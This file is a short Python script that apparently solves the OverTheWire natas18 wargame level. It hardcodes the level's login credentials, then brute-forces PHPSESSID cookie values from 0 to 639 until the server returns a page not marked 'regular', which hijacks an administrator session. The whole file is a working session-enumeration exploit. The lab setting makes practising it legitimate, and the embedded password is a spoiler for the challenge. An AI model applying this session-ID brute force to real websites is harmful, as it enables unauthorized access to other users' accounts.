import requests
from string import ascii_letters, digits


url='http://natas18.natas.labs.overthewire.org/'
auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
s=requests.Session()
s.get(url,auth=auth)
for sid in range(640):
    print(f'trying {sid}')
    s.cookies['PHPSESSID']=str(sid)
    resp=s.get(url,auth=auth)
    if "regular" not in resp.text:
        print(resp.text)
        exit(0)
